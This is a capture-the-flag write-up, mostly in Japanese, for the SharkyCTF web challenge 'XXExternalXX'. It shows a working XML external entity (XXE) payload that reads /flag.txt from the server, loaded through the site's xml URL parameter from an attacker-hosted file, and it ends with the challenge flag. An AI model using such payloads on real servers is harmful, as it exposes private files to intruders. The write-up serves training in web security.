# XXExternalXX:Web:70pts
One of your customer all proud of his new platform asked you to audit it. To show him that you can get information on his server, he hid a file "flag.txt" at the server's root.  
[xxexternalxx.sharkyctf.xyz](http://xxexternalxx.sharkyctf.xyz)  

# Solution
アクセスすると以下のようなサイトとなっている。  
Home  
[site1.png](site/site1.png)  
Show stored data  
[site2.png](site/site2.png)  
Show stored dataページに注目するとURLがhttp://xxexternalxx.sharkyctf.xyz/?xml=data.xml となっている。  
http://xxexternalxx.sharkyctf.xyz/?xml= にアクセスすると以下のエラーが出る。  
```text:エラー
Warning: file_get_contents(): Filename cannot be empty in /var/www/html/index.php on line 20

Warning: DOMDocument::loadXML(): Empty string supplied as input in /var/www/html/index.php on line 23

Warning: simplexml_import_dom(): Invalid Nodetype to import in /var/www/html/index.php on line 24

Notice: Trying to get property 'data' of non-object in /var/www/html/index.php on line 25
```
XXEを行い、flag.txtを読み出せばよい。  
http://www.xxxxx.xxx/hack.xml には以下のxmlを設置した。  
```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY satoki SYSTEM '/flag.txt'>]><root><data>&satoki;</data></root>
```
http://xxexternalxx.sharkyctf.xyz/?xml=http://www.xxxxx.xxx/hack.xml にアクセスするとflagが表示される。  
[flag.png](site/flag.png)  

## shkCTF{G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a}